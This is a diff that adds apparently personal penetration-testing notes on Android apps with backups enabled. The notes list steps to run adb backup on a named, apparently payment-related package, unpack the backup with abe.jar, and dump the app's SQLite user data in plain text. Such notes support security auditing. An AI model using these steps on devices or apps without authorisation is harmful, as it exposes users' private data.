@@ -39,6 +39,22 @@ resmume
 
 ->> android intent launch_activity activityname 
 
+-------------------------------------------------------------------
+Unrestricted backup file - ALLOWED BACKUP = TRUE 
+
+1 - android manifest - check - allow backup = true 
+2 - adb backup -f filename.ab com.pynimo.android (package name)
+3 - abe.jar github \\ google it
+4 - github.com/nelenkov/android-backup-extractor - clone it this will convert in tar 
+5 - https://sourceforge.net/projects/android-backup-processor/files/latest/download or download from here
+6 - https://sourceforge.net/projects/android-backup-processor/files/ 
+7 - java -jar /home/kali/Downloads/android-backup-extractor-20210530-bin/abe.jar unpack /home/kali/Desktop/filename.ab   /home/kali/Desktop/filename.tar 1234
+8 - unzip the tar file 
+9 - cd ~/home/kali/Desktop/apps/com.paynimo.android.fileupload/db/   --/ db locate
+10 - sqlite3 UserDB.db 
+11 - .tables
+12 - select * from table_name \\ list the userdata in plain text 
+13 - 
 
 
 
